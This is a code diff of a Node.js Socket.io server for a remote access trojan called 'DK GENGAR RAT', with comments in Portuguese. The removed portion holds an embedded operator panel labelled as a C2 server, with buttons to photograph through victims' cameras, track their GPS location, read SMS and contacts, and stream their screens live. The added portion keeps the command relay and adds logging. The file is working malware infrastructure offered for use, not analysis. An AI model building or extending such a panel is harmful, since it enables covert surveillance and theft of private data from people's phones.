@@ -1,302 +1,46 @@
-const express = require('express');
-const http = require('http');
-const socketIo = require('socket.io');
+
+const express = require("express");
+const http = require("http");
+const socketIo = require("socket.io");
+const path = require("path");
 
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server);
 
-// --- PAINEL DK GENGAR RAT V1.3 (HTML/CSS/JS EMBUTIDO) ---
-const htmlContent = `
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DK GENGAR RAT - V1.3 (Infiltrated Edition)</title>
-    <style>
-        :root {
-            --roxo-sombrio: #1a0033;
-            --verde-neon: #39ff14;
-            --preto-profundo: #0a0a0a;
-        }
-        body {
-            background-color: var(--roxo-sombrio);
-            color: var(--verde-neon);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            display: flex;
-            height: 100vh;
-            overflow: hidden;
-        }
-        #sidebar {
-            width: 280px;
-            background-color: var(--preto-profundo);
-            border-right: 2px solid var(--verde-neon);
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 5px 0 15px rgba(0,0,0,0.5);
-        }
-        #main-content {
-            flex: 1;
-            padding: 25px;
-            overflow-y: auto;
-            background: radial-gradient(circle at center, #2a0052 0%, #1a0033 100%);
-        }
-        .card {
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid var(--verde-neon);
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            box-shadow: 0 0 20px rgba(57, 255, 20, 0.15);
-        }
-        h2, h3 {
-            margin-top: 0;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px var(--verde-neon);
-        }
-        .btn {
-            background: transparent;
-            border: 2px solid var(--verde-neon);
-            color: var(--verde-neon);
-            padding: 12px 24px;
-            cursor: pointer;
-            text-transform: uppercase;
-            font-weight: bold;
-            margin: 8px;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .btn:hover {
-            background: var(--verde-neon);
-            color: var(--roxo-sombrio);
-            box-shadow: 0 0 25px var(--verde-neon);
-            transform: translateY(-2px);
-        }
-        .btn-live {
-            border-color: #ff0055;
-            color: #ff0055;
-            box-shadow: 0 0 10px rgba(255, 0, 85, 0.3);
-        }
-        .btn-live:hover {
-            background: #ff0055;
-            color: white;
-            box-shadow: 0 0 30px #ff0055;
-        }
-        #log-terminal {
-            background: #000;
-            height: 250px;
-            overflow-y: auto;
-            padding: 15px;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 13px;
-            border: 1px solid #333;
-            border-radius: 8px;
-            line-height: 1.5;
-            color: #00ff00;
-        }
-        .device-item {
-            padding: 15px;
-            border: 1px solid #333;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            cursor: pointer;
-            transition: 0.3s;
-            position: relative;
-        }
-        .device-item:hover {
-            border-color: var(--verde-neon);
-            background: rgba(57, 255, 20, 0.05);
-        }
-        .device-item.active {
-            border-color: var(--verde-neon);
-            background: rgba(57, 255, 20, 0.1);
-            box-shadow: inset 0 0 10px rgba(57, 255, 20, 0.2);
-        }
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            background: var(--verde-neon);
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 8px;
-            box-shadow: 0 0 8px var(--verde-neon);
-        }
-        #live-screen-container {
-            width: 100%;
-            height: 500px;
-            border: 2px solid #333;
-            background: #000;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-        #live-img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
-        .watermark {
-            margin-top: auto;
-            text-align: center;
-            padding: 20px;
-            border-top: 1px solid #333;
-            font-size: 12px;
-            color: #666;
-        }
-        /* Scrollbar Style */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #0a0a0a; }
-        ::-webkit-scrollbar-thumb { background: var(--verde-neon); border-radius: 10px; }
-    </style>
-</head>
-<body>
-    <div id="sidebar">
-        <h2>DK GENGAR RAT</h2>
-        <div style="margin-bottom: 20px;">
-            <span class="status-dot"></span> <small>C2 SERVER ONLINE</small>
-        </div>
-        <hr style="width: 100%; border: 0; border-top: 1px solid #333; margin-bottom: 20px;">
-        <div id="device-list">
-            <!-- Dispositivos aparecerão aqui dinamicamente -->
-        </div>
-        <div class="watermark">
-            Powered by <strong>DK</strong><br>
-            V1.3 Signature Edition
-        </div>
-    </div>
-
-    <div id="main-content">
-        <div class="card">
-            <h3>🎮 CONTROLE REMOTO</h3>
-            <div style="display: flex; flex-wrap: wrap;">
-                <button class="btn" onclick="sendCommand('TAKE_PHOTO')">📸 Câmera</button>
-                <button class="btn" onclick="sendCommand('GET_LOCATION')">📍 GPS</button>
-                <button class="btn" onclick="sendCommand('VIBRATE')">📳 Vibrar</button>
-                <button class="btn" onclick="sendCommand('GET_SMS')">💬 Ler SMS</button>
-                <button class="btn" onclick="sendCommand('GET_CONTACTS')">👥 Contatos</button>
-                <button class="btn btn-live" id="btn-live" onclick="toggleLive()">🔴 TELA AO VIVO</button>
-            </div>
-        </div>
-
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
-            <div class="card">
-                <h3>📜 TERMINAL DE LOGS</h3>
-                <div id="log-terminal">
-                    [${new Date().toLocaleTimeString()}] <span style="color: white;">DK GENGAR RAT - Sistema Inicializado</span><br>
-                </div>
-            </div>
-
-            <div class="card">
-                <h3>📱 VISUALIZAÇÃO EM TEMPO REAL</h3>
-                <div id="live-screen-container">
-                    <div id="live-placeholder" style="text-align: center; color: #444;">
-                        <span style="font-size: 40px;">📵</span><br>
-                        Stream de tela inativo
-                    </div>
-                    <img id="live-img" style="display:none;" />
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
-        let isLive = false;
-        let activeDevice = null;
-
-        function sendCommand(cmd) {
-            const log = document.getElementById("log-terminal");
-            const time = new Date().toLocaleTimeString();
-            log.innerHTML += \`[\${time}] <span style="color: #ffa500;">Enviando: \${cmd}</span><br>\`;
-            log.scrollTop = log.scrollHeight;
-            socket.emit('command', { cmd: cmd });
-        }
-
-        function toggleLive() {
-            const btn = document.getElementById("btn-live");
-            const placeholder = document.getElementById("live-placeholder");
-            const img = document.getElementById("live-img");
-            
-            if (!isLive) {
-                isLive = true;
-                btn.innerHTML = "⏹️ PARAR TELA";
-                placeholder.innerHTML = "📡 CONECTANDO AO DISPOSITIVO...";
-                sendCommand("START_SCREEN_STREAM");
-            } else {
-                isLive = false;
-                btn.innerHTML = "🔴 TELA AO VIVO";
-                placeholder.style.display = "block";
-                placeholder.innerHTML = '<span style="font-size: 40px;">📵</span><br>Stream de tela inativo';
-                img.style.display = "none";
-                sendCommand("STOP_SCREEN_STREAM");
-            }
-        }
-
-        socket.on('screen_frame', (data) => {
-            if (isLive) {
-                const img = document.getElementById("live-img");
-                const placeholder = document.getElementById("live-placeholder");
-                placeholder.style.display = "none";
-                img.style.display = "block";
-                img.src = 'data:image/jpeg;base64,' + data;
-            }
-        });
-
-        socket.on('server_log', (msg) => {
-            const log = document.getElementById("log-terminal");
-            log.innerHTML += \`[\${new Date().toLocaleTimeString()}] <span style="color: #fff;">\${msg}</span><br>\`;
-            log.scrollTop = log.scrollHeight;
-        });
-
-        socket.on('new_device', (data) => {
-            const list = document.getElementById("device-list");
-            const log = document.getElementById("log-terminal");
-            log.innerHTML += \`[\${new Date().toLocaleTimeString()}] <span style="color: var(--verde-neon);">Novo dispositivo conectado: \${data.model}</span><br>\`;
-            list.innerHTML = \`<div class="device-item active">
-                <strong>\${data.model}</strong><br>
-                <small style="color: #888;">OS: \${data.os}</small><br>
-                <small style="color: var(--verde-neon);">Online agora</small>
-            </div>\`;
-        });
-    </script>
-</body>
-</html>
-\`;
-
-app.get('/', (req, res) => {
-    res.send(htmlContent);
+// Serve o arquivo index.html como página principal
+app.get("/", (req, res) => {
+    res.sendFile(path.join(__dirname, "index.html"));
 });
 
-io.on('connection', (socket) => {
-    socket.on('register', (data) => {
-        io.emit('new_device', data);
+io.on("connection", (socket) => {
+    console.log("Nova conexão Socket.io");
+
+    socket.on("register", (data) => {
+        console.log("Dispositivo registrado:", data.model);
+        io.emit("new_device", data);
     });
 
-    socket.on('command', (data) => {
-        socket.broadcast.emit('command', data);
+    socket.on("command", (data) => {
+        console.log("Comando enviado:", data.cmd);
+        socket.broadcast.emit("command", data);
     });
 
-    socket.on('result', (data) => {
-        io.emit('server_log', data.msg);
+    socket.on("result", (data) => {
+        console.log("Resultado recebido:", data.msg);
+        io.emit("server_log", data.msg);
     });
 
-    socket.on('screen_frame', (frame) => {
-        io.emit('screen_frame', frame);
+    socket.on("screen_frame", (frame) => {
+        io.emit("screen_frame", frame);
+    });
+
+    socket.on("disconnect", () => {
+        console.log("Conexão encerrada");
     });
 });
 
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-    console.log('Servidor DK GENGAR RAT rodando na porta ' + PORT);
+    console.log("Servidor DK GENGAR RAT rodando na porta " + PORT);
 });
